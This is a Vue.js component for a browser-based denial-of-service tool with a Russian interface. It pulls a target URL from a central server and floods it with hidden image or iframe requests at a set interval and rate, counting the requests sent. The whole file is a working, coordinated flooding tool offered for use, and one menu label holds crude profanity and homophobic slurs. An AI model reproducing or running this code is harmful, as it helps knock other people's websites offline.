<template>
  <div id="home">
    <div id="ddos">
      <h2>Взрыватель</h2>
      <div id="meta">
        <div class="point">
          <p>Цель: <a :href="point">{{ point }}</a></p>
        </div>
        <div class="counter">
          <p>Запросы: {{ counter }}</p>
        </div>
      </div>
      <div id="loic">
        <div class="mode">
          <div class="interval form-group">
            <div class="input-group">
              <div class="input-group-prepend">
                <div class="input-group-text">Интервал (милисекунды)</div>
              </div>
              <input type="number" v-model.number="interval" class="form-control">
            </div>
          </div>
          <div class="requestsPerPass form-group">
            <div class="input-group">
              <div class="input-group-prepend">
                <div class="input-group-text">
                  Запросов за проход
                </div>
              </div>
              <input type="number" v-model.number="requestsPerPass" class="form-control">
            </div>
          </div>
          <div class="attackType form-group">
            <div class="input-group">
              <div class="input-group-prepend">
                <div class="input-group-text">Тип атаки</div>
              </div>
              <select v-model='mode' class="form-control">
                <option value='img'>Image (лайтовая хуйня, НЕ РАБОТАЕТ У ХРОМОБЛЯДКОВ СРАНЫХ ЕБАЛ ВАС В РОТ ПИДОРАСЫ)</option>
                <option value='iframe'>Iframe (пежже дудосит)</option>
              </select>
            </div>
          </div>
          <button class="btn btn-success" v-if='!started' v-on:click="start()">Старт</button>
          <button class="btn btn-danger" v-else v-on:click="stop()">Стоп</button>
        </div>
        <img class="hidden" v-if='mode == "img"' v-for='addr in addrs' :src="addr" :alt="addr" :title="addr">
        <iframe class="hidden" v-if="mode == 'iframe'" v-for='addr in addrs' :src="addr"></iframe>
      </div>
    </div>
    <Chat></Chat>
  </div>
</template>

<script>
  import Chat from '../components/Chat.vue'
  import $ from 'jquery'
  export default {
    name: 'Home',
    data () {
      return {
        point: "",
        counter: Number(),
        started: false,
        interval: 500,
        addrs: [],
        requestsPerPass: 1,
        mode: 'img'
      }
    },
    components: { Chat },
    methods: {
      fetchPoint () {
        var that = this
        var vm = that.$root
        $.ajax({
          url: vm.config.api,
          data: {
            method: 'point'
          },
          success (data) {
            if (data.success) {
              that.point = data.success
            }
            else {
              console.error(data.error)
            }
          }
        })
      },
      newRandom () {
        let addrs = []
        let delimitter = /\?/g.test(this.point) ? '&' : '?'
        if (this.addrs.length == 1000)
          this.addrs = []
        for (let i=0; i < this.requestsPerPass; i++) {
          addrs.push(`${this.point}${delimitter}PVD_RULEZZ=${random()}&weAre=https://thirdwave.tk/`)
        }
        this.addrs = this.addrs.concat(addrs)
      },
      start () {
        var that = this
        this.started = true
        window.attack = setInterval(() => {
          that.newRandom()
          that.counter += that.requestsPerPass
        }, that.interval)
      },
      stop () {
        this.started = false
        clearInterval(window.attack)
      },
      loadPage () {
        this.fetchPoint()
      }
    },
    created () {
      this.loadPage()
    }
  }
</script>
